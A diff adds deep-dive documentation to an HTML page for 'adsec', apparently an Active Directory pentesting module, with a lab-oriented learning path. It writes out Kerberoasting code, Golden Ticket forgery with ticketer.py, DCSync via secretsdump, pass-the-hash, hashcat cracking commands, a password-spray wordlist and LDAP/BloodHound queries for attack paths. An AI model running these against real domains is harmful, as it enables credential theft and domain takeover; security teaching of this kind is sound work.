@@ -660,6 +660,13 @@ footer { border-top: 1px solid var(--border); margin-top: 2rem; }
         <li><div class="sidebar-sep">More</div></li>
         <li><a href="#examples">Examples</a></li>
         <li><a href="#requirements">Requirements</a></li>
+        <li><div class="sidebar-sep">Deep Dive</div></li>
+        <li><a href="#adsec-arch">adsec Architecture</a></li>
+        <li><a href="#kerberos-wire">Kerberos Wire Format</a></li>
+        <li><a href="#ldap-ber">LDAP/BER Internals</a></li>
+        <li><a href="#bloodhound-graph">BloodHound Graph</a></li>
+        <li><a href="#adsec-customization">Customization</a></li>
+        <li><a href="#adsec-learning">Learning Path</a></li>
       </ul>
     </aside>
 
@@ -667,6 +674,48 @@ footer { border-top: 1px solid var(--border); margin-top: 2rem; }
     <div class="content">
 
       <!-- Overview -->
+            <!-- ═══════════════════════════════════════════════════════
+           BEGINNER STARTUP — read foundations.html first
+           ═══════════════════════════════════════════════════════ -->
+      <div id="beginner-startup" style="background:linear-gradient(135deg,#0d2018,#111a15);border:2px solid rgba(74,222,128,0.35);border-radius:12px;padding:1.6rem 2rem;margin-bottom:2.5rem">
+        <div style="display:flex;align-items:center;gap:0.8rem;margin-bottom:1rem">
+          <div style="width:32px;height:32px;background:#1a4a2e;border:1px solid rgba(74,222,128,0.4);border-radius:7px;display:flex;align-items:center;justify-content:center;flex-shrink:0">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg>
+          </div>
+          <div>
+            <div style="font-size:0.48rem;letter-spacing:0.22em;text-transform:uppercase;color:rgba(74,222,128,0.7)">Beginner Startup</div>
+            <div style="font-size:0.72rem;font-weight:700;color:#f0ede6">New to secV or adsec? Start here.</div>
+          </div>
+          <a href="../foundations.html" style="margin-left:auto;font-size:0.52rem;color:#4ade80;text-decoration:none;border:1px solid rgba(74,222,128,0.35);padding:0.3rem 0.7rem;border-radius:5px;white-space:nowrap" onmouseover="this.style.background='rgba(74,222,128,0.1)'" onmouseout="this.style.background='transparent'">Foundations guide &rarr;</a>
+        </div>
+        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:0.8rem;margin-bottom:1.2rem">
+          <div style="background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:0.9rem 1rem">
+            <div style="font-size:0.54rem;font-weight:700;color:#f0ede6;margin-bottom:0.4rem">What you need first</div>
+            <ul style="list-style:none;font-size:0.58rem;color:#666;line-height:1.9"><li>▸ Active Directory lab environment (see windowsAD module first)</li>
+<li>▸ <code>impacket</code>, <code>bloodhound</code>, <code>crackmapexec</code></li>
+<li>▸ Compromise of at least one domain account (from windowsAD enum)</li></ul>
+          </div>
+          <div style="background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:0.9rem 1rem">
+            <div style="font-size:0.54rem;font-weight:700;color:#f0ede6;margin-bottom:0.4rem">Your first safe command</div>
+            <pre style="font-size:0.58rem;color:#9a9a9a;line-height:1.7;margin:0;white-space:pre-wrap">set operation enum
+set dc 192.168.1.x
+set domain lab.local
+run</pre>
+          </div>
+          <div style="background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:0.9rem 1rem">
+            <div style="font-size:0.54rem;font-weight:700;color:#f0ede6;margin-bottom:0.4rem">Operations by difficulty</div>
+            <ul style="list-style:none;font-size:0.58rem;color:#666;line-height:1.9">
+              <li><span style="color:#4ade80">&bull;</span> <strong style="color:#bbb">Easy:</strong> enum, acl_scan, trust_map</li>
+              <li><span style="color:#fbbf24">&bull;</span> <strong style="color:#bbb">Medium:</strong> silver_ticket, constrained_deleg, shadow_cred</li>
+              <li><span style="color:#f87171">&bull;</span> <strong style="color:#bbb">Advanced:</strong> golden_ticket, dcsync, forest_trust_abuse</li>
+            </ul>
+          </div>
+        </div>
+        <div style="font-size:0.58rem;color:#555;border-top:1px solid rgba(255,255,255,0.06);padding-top:0.8rem">
+          <strong style="color:#888">Key terms:</strong> <a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">Golden Ticket</a> — Forged Kerberos TGT using the KRBTGT hash — unlimited domain access &nbsp;·&nbsp; <a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">Silver Ticket</a> — Forged Kerberos service ticket for one specific service &nbsp;·&nbsp; <a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">ACL Abuse</a> — Exploiting Access Control List misconfigurations to escalate privileges &nbsp;·&nbsp; <a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">BloodHound</a> — Graph-based AD attack path visualizer — find the shortest path to Domain Admin
+          &nbsp;&mdash;&nbsp;<a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">Full glossary &rarr;</a>
+        </div>
+      </div>
       <section id="overview">
         <p class="sec-label">Overview</p>
         <h2>What adsec does</h2>
@@ -1071,6 +1120,398 @@ hashcat -m 18200 /tmp/adsec-loot/asreproast-*.hashes /usr/share/wordlists/rockyo
           All five dependencies are checked at startup. If a dependency is missing, adsec reports which operations are unavailable and exits cleanly rather than failing mid-operation. Install all five for full functionality across all 16 operations.
         </div>
         <p>All dependencies are available via pip3 and are present by default on Kali Linux and BlackArch. On Arch Linux and Debian, install them with pip3 inside a virtual environment or use the system package manager where packages are available (e.g. <code>python3-impacket</code> on Debian).</p>
+      </section>
+
+
+
+      <!-- ═══════════════════════════════════════════════════════════
+           ADSEC ARCHITECTURE
+      ════════════════════════════════════════════════════════════════ -->
+      <section id="adsec-arch">
+        <h2>adsec Architecture Deep Dive</h2>
+        <p>adsec is the <em>Linux-side</em> Active Directory penetration testing module. It wraps a collection of Python libraries (impacket, ldap3) and external tools (nmap, kerbrute, nxc) into a unified JSON interface that fits the secV module system. Every operation is a pure-Python function with optional external-tool acceleration — if a tool is missing, adsec falls back to native impacket or ldap3 code.</p>
+
+        <h3>Module code path</h3>
+        <pre><code>tools/network/adsec/adsec.py
+├── main(json_input)
+│   ├── parse_params()         → target, domain, user, pass, operation
+│   ├── check_capabilities()   → nmap/nxc/kerbrute/ldap3/impacket available?
+│   └── dispatch(operation)    → calls the right function
+│
+├── discover(target)           → nmap AD ports + LDAP rootDSE + SMB probe
+├── users(target, domain, ...)  → impacket SAMR / ldap3 userlist
+├── groups(target, ...)         → LDAP memberOf + SAMR group enum
+├── shares(target, ...)         → impacket SMBConnection.listShares()
+├── passpol(target, ...)        → SAMR GetDomainInfo (lockout, min length)
+├── kerberoast(target, ...)     → find SPNs → request TGS → extract hash
+├── asreproast(target, ...)     → LDAP filter DONT_REQUIRE_PREAUTH
+├── spray(target, ...)          → lockout-safe password spray loop
+├── vulncheck(target, ...)      → Zerologon/PetitPotam/NoPac probes
+├── bloodhound(target, ...)     → bloodhound-python collect all
+├── loot(target, ...)           → secretsdump.py (DRSUAPI/registry)
+├── secrets(target, ...)        → secretsdump.py local (SYSTEM hive)
+├── auto(target, ...)           → discover→users→shares→kerberoast→spray
+├── exec(target, ...)           → wmiexec → fallback impacket WMI
+└── privesc_check(target, ...)  → PS audit script via -EncodedCommand</code></pre>
+
+        <h3>impacket library internals</h3>
+        <p>impacket is a Python library implementing dozens of Windows network protocols from scratch. adsec uses it instead of calling external binaries for critical paths — meaning it works even without Kali extras installed.</p>
+        <pre><code>impacket.dcerpc.v5.samr   → SAMR RPC: enumerate users, groups, password policy
+impacket.dcerpc.v5.drsuapi → DCSync: DS-Replication-Get-Changes-All
+impacket.krb5.kerberosv5  → Kerberos: AS-REQ/AS-REP, TGS-REQ/TGS-REP
+impacket.smbconnection     → SMB1/2/3: share enumeration, file access
+impacket.nmb               → NetBIOS Name Service queries
+
+# adsec kerberoasting (pure impacket, no GetUserSPNs.py external call):
+from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
+from impacket.krb5 import constants
+from impacket.krb5.types import KerberosTime, Principal
+
+tgt, cipher, oldSKey, sessionKey = getKerberosTGT(
+    clientName, password, domain, "", "", kdcHost
+)
+for spn in found_spns:
+    tgs, cipher2, _, tgsSessionKey = getKerberosTGS(
+        Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value),
+        domain, kdcHost, tgt, cipher, sessionKey
+    )
+    # Extract hash from tgs for hashcat -m 13100</code></pre>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════════════════
+           KERBEROS WIRE FORMAT
+      ════════════════════════════════════════════════════════════════ -->
+      <section id="kerberos-wire">
+        <h2>Kerberos Wire Format</h2>
+        <p>Kerberos v5 messages are encoded in <strong>ASN.1 DER</strong> (Distinguished Encoding Rules) — a binary serialization format. Every field is a TLV: Tag byte(s) + Length byte(s) + Value. Understanding the wire format is essential for building attack tools and understanding what impacket is doing under the hood.</p>
+
+        <h3>AS-REQ structure (authentication request)</h3>
+        <pre><code># Sent by client → KDC port 88 (TCP or UDP)
+# ASN.1 APPLICATION [10] (0x6A) — AS-REQ
+
+6A 82 01 23          # Tag=AS-REQ (app 10), length=0x123
+  30 82 01 1F        # SEQUENCE
+    A1 03            # pvno [1] — Kerberos version
+      02 01 05       # INTEGER 5
+    A2 03            # msg-type [2]
+      02 01 0A       # INTEGER 10 = AS-REQ
+    A3 ...           # padata [3] — optional pre-authentication
+      # WITHOUT padata = AS-REP Roastable (DONT_REQUIRE_PREAUTH)
+      # WITH padata type 2 (ENC-TIMESTAMP) = normal auth
+    A4 ...           # req-body [4]
+      30 ...         # KDC-REQ-BODY
+        A0 07        # kdc-options [0] — flags bitmask
+        A1 ...       # cname [1] — client principal (username)
+        A2 ...       # realm [2] — domain (CORP.LOCAL)
+        A3 ...       # sname [3] — krbtgt/CORP.LOCAL for AS-REQ
+        A5 ...       # till [5] — expiry (10 years out for tools)
+        A7 03        # nonce [7]
+          02 01 xx   # random 4-byte nonce
+        A8 ...       # etype [8] — accepted encryption types
+          # 0x17 = RC4 (NTLM hash as key) — used for roasting
+          # 0x12 = AES256 — modern clients prefer this</code></pre>
+
+        <h3>AS-REP Roastable response</h3>
+        <pre><code># When DONT_REQUIRE_PREAUTH is set on an account:
+# KDC returns AS-REP without verifying the client knows the password.
+# The enc-part is encrypted with the user's key (derived from their password).
+# You can crack it offline.
+
+AS-REP:
+  6B ...             # Tag=AS-REP (app 11)
+    enc-part:
+      etype: 23      # RC4_HMAC (0x17)
+      cipher: [encrypted-session-key-and-timestamp]
+        # First 16 bytes: HMAC-MD5 checksum (the "hash" you crack)
+
+# hashcat format (-m 18200):
+$krb5asrep$23$username@DOMAIN.COM:&lt;16-byte-checksum&gt;$&lt;cipher-data&gt;</code></pre>
+
+        <h3>TGS-REP hash format (Kerberoasting)</h3>
+        <pre><code># Client requests service ticket for an SPN with any auth type.
+# Ticket enc-part is encrypted with service account's NTLM hash.
+
+TGS-REP:
+  6D ...             # Tag=TGS-REP (app 13)
+    ticket:
+      enc-part:
+        etype: 23    # RC4_HMAC (requested for roasting)
+        cipher:      # crackable with hashcat -m 13100
+
+# hashcat format:
+$krb5tgs$23$*username$DOMAIN.COM$SPN*$&lt;hash&gt;$&lt;cipher&gt;
+
+# Cracking:
+hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
+hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt</code></pre>
+
+        <h3>Golden Ticket bytes</h3>
+        <pre><code># Golden Ticket = forged TGT encrypted with krbtgt NTLM hash
+# Once you have the krbtgt hash (from DCSync), you can forge any TGT.
+
+# impacket ticketer.py:
+ticketer.py -nthash &lt;krbtgt_ntlm_hash&gt; \
+            -domain-sid S-1-5-21-&lt;domain-SID&gt; \
+            -domain CORP.LOCAL Administrator
+
+# Creates: Administrator.ccache — Kerberos credential cache
+export KRB5CCNAME=Administrator.ccache
+secretsdump.py -k -no-pass DC01.corp.local  # uses forged TGT
+
+# The forged ticket has:
+# - validity: 10 years (normal TGTs last 10 hours)
+# - PAC (Privilege Attribute Certificate) signed with krbtgt key
+# - group memberships: domain admins, enterprise admins, etc.
+# - survives password resets of target accounts (only krbtgt reset fixes it)</code></pre>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════════════════
+           LDAP / BER INTERNALS
+      ════════════════════════════════════════════════════════════════ -->
+      <section id="ldap-ber">
+        <h2>LDAP and BER Wire Format</h2>
+        <p><strong>What is LDAP?</strong> The Lightweight Directory Access Protocol is a TCP protocol (port 389, TLS port 636) for querying directory services. In AD it exposes the entire domain database — users, computers, groups, GPOs, trusts — as a tree of objects. Each object has <em>attributes</em> (key-value pairs). LDAP filters let you search the tree. Every AD pentest starts with LDAP enumeration.</p>
+
+        <h3>LDAP message wire format (BER)</h3>
+        <pre><code># LDAP messages are Basic Encoding Rules (BER) — a subset of ASN.1 DER
+# Tag 0x30 = SEQUENCE (universal), 0x60 = BIND-REQUEST (application 0)
+
+30 2F                # SEQUENCE (LDAPMessage)
+  02 01 01           # messageID = 1 (INTEGER)
+  60 2A              # BindRequest (application 0)
+    02 01 03         # version = 3
+    04 00            # name = "" (anonymous bind)
+    80 00            # simple authentication, password = ""
+# Anonymous bind to AD: many DCs still allow this by default
+# adsec uses ldap3: conn = ldap3.Connection(server, authentication=ANONYMOUS)
+
+# Authenticated bind (simple — cleartext, only use over TLS!):
+30 3E
+  02 01 02
+  60 39
+    02 01 03
+    04 14 43 4F 52 50 5C 61 64 6D 69 6E  # "CORP\admin" (DN)
+    80 08 50 61 73 73 77 30 72 64         # "Passw0rd"</code></pre>
+
+        <h3>LDAP search request</h3>
+        <pre><code># SearchRequest — find all enabled user accounts
+30 49              # SEQUENCE
+  02 01 03         # messageID
+  63 44            # SearchRequest (application 3)
+    04 00          # baseObject = "" (search whole domain)
+    0A 01 02       # scope = 2 (subtree — search entire tree)
+    0A 01 00       # derefAliases = 0 (never)
+    02 01 00       # sizeLimit = 0 (unlimited)
+    02 01 00       # timeLimit = 0 (unlimited)
+    01 01 00       # typesOnly = false (return values too)
+    A0 28          # filter = AND
+      A3 24        # equalityMatch
+        04 0B 6F 62 6A 65 63 74 43 6C 61 73 73  # "objectClass"
+        04 04 75 73 65 72                        # "user"
+    30 00          # attributes = [] (all)</code></pre>
+
+        <h3>Key LDAP filters for AD pentesting</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Filter</th><th>Finds</th></tr></thead>
+            <tbody>
+              <tr><td><code>(&amp;(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))</code></td><td>All enabled users</td></tr>
+              <tr><td><code>(userAccountControl:1.2.840.113556.1.4.803:=4194304)</code></td><td>AS-REP Roastable (DONT_REQUIRE_PREAUTH)</td></tr>
+              <tr><td><code>(&amp;(objectClass=user)(servicePrincipalName=*))</code></td><td>Kerberoastable (SPN set)</td></tr>
+              <tr><td><code>(userAccountControl:1.2.840.113556.1.4.803:=524288)</code></td><td>Trusted for unconstrained delegation</td></tr>
+              <tr><td><code>(ms-DS-MachineAccountQuota&gt;0)</code></td><td>Non-admin users can add machine accounts</td></tr>
+              <tr><td><code>(objectClass=trustedDomain)</code></td><td>Domain trusts (forest enumeration)</td></tr>
+              <tr><td><code>(&amp;(objectClass=computer)(ms-Mcs-AdmPwd=*))</code></td><td>LAPS password readable</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <p>The OID <code>1.2.840.113556.1.4.803</code> is the "bitwise AND" matching rule — it checks if a bit flag is set in an integer attribute. This is how you query <code>userAccountControl</code> bit by bit in LDAP.</p>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════════════════
+           BLOODHOUND GRAPH
+      ════════════════════════════════════════════════════════════════ -->
+      <section id="bloodhound-graph">
+        <h2>BloodHound Graph Internals</h2>
+        <p>BloodHound collects AD data (via LDAP, SMB, and RPC) and stores it in a Neo4j graph database. Each node is an AD object (User, Computer, Group, GPO, OU, Domain). Each edge is a relationship with an attack implication. The power of BloodHound is that it finds attack paths by graph traversal — paths you would never find by manual enumeration.</p>
+
+        <h3>Data collection (bloodhound-python)</h3>
+        <pre><code># adsec bloodhound operation runs:
+bloodhound-python -d CORP.LOCAL -u username -p password \
+                  -dc DC01.corp.local \
+                  -c All          # All = Users, Groups, Computers,
+                                  #       LocalAdmins, Sessions, ACLs, Trusts
+# Output: JSON files (users.json, groups.json, computers.json, ...)
+# Import into BloodHound UI → Neo4j → enable attack path queries</code></pre>
+
+        <h3>Key BloodHound edges (attack relationships)</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Edge</th><th>Meaning</th><th>Attack</th></tr></thead>
+            <tbody>
+              <tr><td>MemberOf</td><td>User is member of Group</td><td>Privilege inherited from group</td></tr>
+              <tr><td>AdminTo</td><td>User/Group has local admin on Computer</td><td>Can run code, dump LSASS</td></tr>
+              <tr><td>HasSession</td><td>User has active logon session on Computer</td><td>Token impersonation if local admin on host</td></tr>
+              <tr><td>GenericAll</td><td>Full control over object</td><td>Add member, reset password, set SPN</td></tr>
+              <tr><td>GenericWrite</td><td>Write all properties</td><td>Set SPN (Kerberoast), modify logon script</td></tr>
+              <tr><td>WriteOwner</td><td>Can change owner of object</td><td>Take ownership → GenericAll</td></tr>
+              <tr><td>AllExtendedRights</td><td>All extended AD rights</td><td>Reset password, DCSync permissions</td></tr>
+              <tr><td>ForceChangePassword</td><td>Can reset user's password</td><td>Set known password → authenticate as user</td></tr>
+              <tr><td>DCSync</td><td>DS-Replication-Get-Changes-All</td><td>Dump all hashes without touching disk</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Shortest path queries (Neo4j Cypher)</h3>
+        <pre><code"># Find shortest path from any domain user to Domain Admins:
+MATCH p=shortestPath(
+  (u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
+) RETURN p
+
+# Find computers with unconstrained delegation:
+MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
+
+# Find users with DONT_REQUIRE_PREAUTH:
+MATCH (u:User {dontreqpreauth:true}) RETURN u.name, u.enabled
+
+# Find all paths between two specific nodes:
+MATCH p=allShortestPaths(
+  (a:User {name:"USER@CORP.LOCAL"})-[*]->(b:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
+) RETURN p</code></pre>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════════════════
+           ADSEC CUSTOMIZATION
+      ════════════════════════════════════════════════════════════════ -->
+      <section id="adsec-customization">
+        <h2>Customization &amp; Extension</h2>
+
+        <h3>Adding a custom vulnerability check</h3>
+        <pre><code># Add ESC1 check — ADCS misconfigured certificate template
+# (AD Certificate Services escalation — any user can request cert for any user)
+
+from impacket.ldap import ldap, ldapasn1
+
+def check_adcs_esc1(target, domain, username, password):
+    """Find certificate templates with ESC1 misconfiguration."""
+    # ESC1: enrollee supplies subject + template allows any SAN + low privilege enroll
+    ldap_filter = (
+        "(&(objectClass=pKICertificateTemplate)"
+        "(|(msPKI-Certificate-Name-Flag:1.2.840.113556.1.4.803:=1)"  # ENROLLEE_SUPPLIES_SUBJECT
+        "(msPKI-Enrollment-Flag:1.2.840.113556.1.4.803:=1))"         # INCLUDE_SYMMETRIC_ALGORITHMS
+        ")"
+    )
+    conn = ldap3.Connection(
+        ldap3.Server(target), user=f"{domain}\\{username}",
+        password=password, authentication=ldap3.NTLM
+    )
+    conn.bind()
+    conn.search(
+        f"CN=Certificate Templates,CN=Public Key Services,CN=Services,"
+        f"CN=Configuration,DC={',DC='.join(domain.split('.'))}",
+        ldap_filter,
+        attributes=["name", "msPKI-Certificate-Name-Flag",
+                    "msPKI-Enrollment-Flag", "nTSecurityDescriptor"]
+    )
+    vulnerable = []
+    for entry in conn.entries:
+        vulnerable.append({
+            "template": entry.name.value,
+            "flags": str(entry["msPKI-Certificate-Name-Flag"])
+        })
+    return {"adcs_esc1_templates": vulnerable}
+
+# Add to module.json:
+# { "name": "adcs_check", "description": "ADCS ESC1-8 template audit" }</code></pre>
+
+        <h3>Adding a new spray wordlist</h3>
+        <pre><code># adsec spray uses a built-in seasonal + common password list
+# Extend it with domain-specific guesses:
+
+SPRAY_WORDLIST = [
+    "Password1", "Password1!", "Welcome1", "Welcome1!",
+    "Spring2025!", "Summer2025!", "Winter2025!",
+    "{company}2025", "{company}2025!",
+    "Changeme1!", "Letmein1!"
+]
+
+def generate_seasonal_passwords(company_name=""):
+    import datetime
+    year = datetime.datetime.now().year
+    season = ["Spring", "Summer", "Fall", "Winter"][
+        (datetime.datetime.now().month - 1) // 3
+    ]
+    extra = [
+        f"{season}{year}!", f"{season}{year}",
+        f"{company_name}{year}!" if company_name else None,
+        f"{company_name}1!" if company_name else None,
+    ]
+    return SPRAY_WORDLIST + [p for p in extra if p]</code></pre>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════════════════
+           ADSEC LEARNING PATH
+      ════════════════════════════════════════════════════════════════ -->
+      <section id="adsec-learning">
+        <h2>Learning Path</h2>
+
+        <h3>Recommended resources</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Resource</th><th>Format</th><th>Focus</th></tr></thead>
+            <tbody>
+              <tr><td><a href="https://tryhackme.com/room/activedirectorybasics" target="_blank">TryHackMe — AD Basics</a></td><td>Free guided lab</td><td>AD structure, Kerberos, users and groups</td></tr>
+              <tr><td><a href="https://tryhackme.com/room/attackingkerberos" target="_blank">TryHackMe — Attacking Kerberos</a></td><td>Free guided lab</td><td>AS-REP Roasting, Kerberoasting, Golden Ticket</td></tr>
+              <tr><td><a href="https://github.com/Orange-Cyberdefense/GOAD" target="_blank">GOAD Lab</a></td><td>Vagrant AD lab</td><td>Full multi-domain AD lab with intentional vulns</td></tr>
+              <tr><td><a href="https://www.ired.team/" target="_blank">Red Team Notes (ired.team)</a></td><td>Free web reference</td><td>Every AD attack technique with code</td></tr>
+              <tr><td><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology" target="_blank">HackTricks AD Methodology</a></td><td>Free wiki</td><td>Checklist-style AD attack chain</td></tr>
+              <tr><td><em>The Hacker Playbook 3</em> — Peter Kim</td><td>Book</td><td>AD-focused red team methodology</td></tr>
+              <tr><td><a href="https://www.bloodhoundenterprise.io/blog" target="_blank">BloodHound Enterprise Blog</a></td><td>Articles</td><td>Attack path research, new AD techniques</td></tr>
+              <tr><td><a href="https://github.com/ly4k/Certipy" target="_blank">Certipy</a></td><td>Tool + writeups</td><td>ADCS ESC1-13 attack techniques</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Practice progression (8 weeks)</h3>
+        <pre><code">Week 1 — AD fundamentals
+  ▸ TryHackMe: Active Directory Basics (free)
+  ▸ TryHackMe: Breaching Active Directory
+  ▸ Set up GOAD lab (Vagrant + VirtualBox) or use TryHackMe AD rooms
+
+Week 2 — Enumeration
+  ▸ adsec discover + users + groups + shares on GOAD
+  ▸ Manual LDAP with ldapsearch -x -H ldap://DC -b "" "(objectClass=*)"
+  ▸ Understand bloodhound output — import JSON, explore graph
+
+Week 3 — AS-REP Roasting and Kerberoasting
+  ▸ adsec asreproast on GOAD (has ASREPRoast accounts pre-configured)
+  ▸ adsec kerberoast → save hashes → hashcat -m 18200 / -m 13100
+  ▸ Crack successfully → authenticate as service account
+
+Week 4 — Password spraying
+  ▸ adsec passpol first (never spray without knowing lockout policy!)
+  ▸ adsec spray with seasonal wordlist
+  ▸ Practice lockout awareness: buffer = maxAttempts - 2
+
+Week 5 — DCSync and secrets
+  ▸ Get DA credentials (from cracked hash or spray)
+  ▸ adsec loot (DCSync) → extract all hashes
+  ▸ Pass-the-Hash with nxc: nxc smb &lt;target&gt; -u admin -H &lt;NT-hash&gt;
+
+Week 6 — Kerberos attacks
+  ▸ Golden Ticket with impacket ticketer.py
+  ▸ Unconstrained delegation abuse (TryHackMe: Exploiting AD)
+  ▸ ADCS: Certipy find + Certipy req (ESC1 if GOAD has PKI role)
+
+Week 7 — BloodHound attack paths
+  ▸ adsec bloodhound on GOAD
+  ▸ Find shortest path to DA in BloodHound GUI
+  ▸ Execute the attack path manually step by step
+
+Week 8 — Full engagement simulation
+  ▸ Start from unauthenticated on GOAD external network
+  ▸ Responder → capture NTLMv2 → crack → spray → DCSync
+  ▸ Document as a pentest report (TTP chain with evidence)</code></pre>
       </section>
 
     </div><!-- /content -->
